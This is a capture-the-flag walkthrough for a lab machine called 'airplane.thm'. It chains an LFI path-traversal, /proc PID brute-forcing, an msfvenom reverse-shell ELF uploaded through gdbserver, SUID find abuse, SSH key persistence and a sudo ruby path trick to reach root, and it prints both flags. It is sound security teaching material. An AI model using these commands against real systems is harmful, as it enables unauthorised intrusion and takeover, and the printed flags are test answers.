# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 6048 | X11?    |
| 8000 | HTTP    |



# RECONNAISSANCE
---

We need to add `airplane.thm` to `/etc/hosts`:

```bash
echo '10.10.62.55 airplane.thm' | sudo tee -a /etc/hosts
```

Once we enter the website, we can notice the following:

![Pasted image 20250422135925.png](../../IMAGES/Pasted%20image%2020250422135925.png)

The url seems suspicious, it seems as it could be vulnerable to LFI, let's try reading `/etc/passwd`:


![Pasted image 20250422140134.png](../../IMAGES/Pasted%20image%2020250422140134.png)

As we can see, if we use `path traversal`, we can read `/etc/passwd`, since this server is vulnerable to `LFI`, we can test other stuff, for example, let's try reading
`proc/self/environ`:

```
../../../../../proc/self/environ
```

![Pasted image 20250422141057.png](../../IMAGES/Pasted%20image%2020250422141057.png)

We get this:

```
LANG=en_US.UTF-8
LC_ADDRESS=tr_TR.UTF-8
LC_IDENTIFICATION=tr_TR.UTF-8
LC_MEASUREMENT=tr_TR.UTF-8
LC_MONETARY=tr_TR.UTF-8
LC_NAME=tr_TR.UTF-8
LC_NUMERIC=tr_TR.UTF-8
LC_PAPER=tr_TR.UTF-8
LC_TELEPHONE=tr_TR.UTF-8
LC_TIME=tr_TR.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
HOME=/home/hudson
LOGNAME=hudson
USER=hudson
SHELL=/bin/bash
INVOCATION_ID=5da2e4a284be419f834a40bee5eeac5f
JOURNAL_STREAM=9:18702
```

Based on that, we can find the `app.py` on `/home/hudson/app/app.py`, let's try reading it:

```
../../../../..//home/hudson/app/app.py
```


![Pasted image 20250422141515.png](../../IMAGES/Pasted%20image%2020250422141515.png)

Not much, seems like this only tells us the way it's vulnerable to LFI, but we can keep on digging, for example, we can try reading:

```
proc/self/cmdline
```

![Pasted image 20250422141742.png](../../IMAGES/Pasted%20image%2020250422141742.png)

It works, based on the scan, we notice we got something else running on port `6048`, we can use the same technique to visualize what may be running on it, we need to change it to this format:

```
/proc/pid/cmdline
```

`/proc/pid/cmdline`Â is similar toÂ `/proc/self/cmdline`, but instead of showing the command-line arguments of theÂ **current process**Â (`self`), it reveals the command-line details ofÂ **any running process**Â on the system, identified by its Process ID (PID). This can be extremely useful for privilege escalation or lateral movement in a CTF or penetration testing scenario.

We need to perform brute force in order to find the different `PIDS`, we can use `ffuf` or in this case, I will use `caido` to perform the brute force, let's start by creating a file with PIDS:

```
seq 1000 > id.txt
```

Now, we can use `caido`'s automate functionality:


![Pasted image 20250422150920.png](../../IMAGES/Pasted%20image%2020250422150920.png)

![Pasted image 20250422151532.png](../../IMAGES/Pasted%20image%2020250422151532.png)

Once the scan is finished, we can filter in the following way:

```
resp.raw.ncont:"Page" AND resp.raw.cont:"gdb"
```

We can see the following:

![Pasted image 20250422151516.png](../../IMAGES/Pasted%20image%2020250422151516.png)

Seems like this is running `gdbserver`, let's begin exploitation.



# EXPLOITATION
---

We can use the following information:

**HackTricks**: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html#upload-and-execute


We can follow this PoC to get a shell:

```bash
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.10.11:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/user/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```

Nice, let's do it:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf
gdb binary.elf
```

![Pasted image 20250422151922.png](../../IMAGES/Pasted%20image%2020250422151922.png)

We get prompted with this, we can now proceed:

```BASH
target extended-remote 10.10.251.121:6048
remote put binary.elf /home/hudson/binary.elf
set remote exec-file /home/hudson/binary.elf
nc -lvnp 4444 # Outside of the gdb prompt
run
```

If we do everything correctly, we get the connection on our listener:

![Pasted image 20250422152429.png](../../IMAGES/Pasted%20image%2020250422152429.png)

Let's begin privilege escalation.



# PRIVILEGE ESCALATION
---

Let's stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250422152543.png](../../IMAGES/Pasted%20image%2020250422152543.png)

Let's use `linpeas` to check any PE vector:

![Pasted image 20250422153011.png](../../IMAGES/Pasted%20image%2020250422153011.png)

There we go, we find an interesting `SUID` binary, let's search `GTFOBINS`:

![Pasted image 20250422153104.png](../../IMAGES/Pasted%20image%2020250422153104.png)

So, we need to do:

```
/usr/bin/find . -exec /bin/bash -p \; -quit
```

![Pasted image 20250422153149.png](../../IMAGES/Pasted%20image%2020250422153149.png)

We escalated to `carlos`, to make the experience more comfortable, we can create a ssh-key and put it in `authorized_keys`:

```
ssh-keygen -t rsa
```

Now, copy the contents:

```
echo "Contents of your key" >> /home/carlos/.ssh/authorized_keys
```

Once we do it, we can go into ssh using:

```
ssh carlos@airplane.thm -i airplane_rsa
```

![Pasted image 20250422153822.png](../../IMAGES/Pasted%20image%2020250422153822.png)

Nice, let's look around again, for example, let's check if we got `sudo` privileges:

```
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

Let's look up `GTFOBINS`:

![Pasted image 20250422153927.png](../../IMAGES/Pasted%20image%2020250422153927.png)

So, in order to get root shell, we can do:

```bash
echo 'exec "/bin/bash"' >> /tmp/privesc.rb
sudo /usr/bin/ruby /root/../tmp/privesc.rb
```

![Pasted image 20250422154046.png](../../IMAGES/Pasted%20image%2020250422154046.png)

There we go, we can finally read both flags and finish the CTF:

```
root@airplane:/home/carlos# cat user.txt
eebfca2ca5a2b8a56c46c781aeea7562
```

```
root@airplane:/home/carlos# cat /root/root.txt
190dcbeb688ce5fe029f26a1e5fce002
```

![Pasted image 20250422154148.png](../../IMAGES/Pasted%20image%2020250422154148.png)

